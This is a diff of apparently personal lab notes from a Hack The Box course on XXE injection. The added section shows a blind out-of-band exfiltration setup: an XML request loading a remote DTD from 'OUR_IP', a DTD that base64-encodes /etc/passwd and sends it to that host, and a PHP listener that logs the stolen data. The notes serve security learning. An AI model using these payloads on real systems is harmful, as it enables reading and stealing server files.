@@ -80,3 +80,40 @@ HaakonWiland@htb[/htb]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
 HaakonWiland@htb[/htb]$ python3 -m http.server 8000
 ```
 - We must do this since xml does not allow joining of internal and external resources 
+
+**Blind XXE for data exfiltration**
+Since we do not get any output, the idea is to send the output to our server instead. Similar to blind xxs attacks. 
+
+We need:
+- The request we send to the target 
+- A payload - we use a .dtd file 
+- And a server - we use a basic php server 
+
+Request we send to the target:
+```php
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  %remote;
+  %oob;
+]>
+<root>&content;</root>
+```
+
+
+
+Payload: xxe.dtd
+```
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
+```
+
+PHP server: index.php
+```php
+<?php
+if(isset($_GET['content'])){
+    error_log("\n\n" . base64_decode($_GET['content']));
+}
+?>
+```
+-
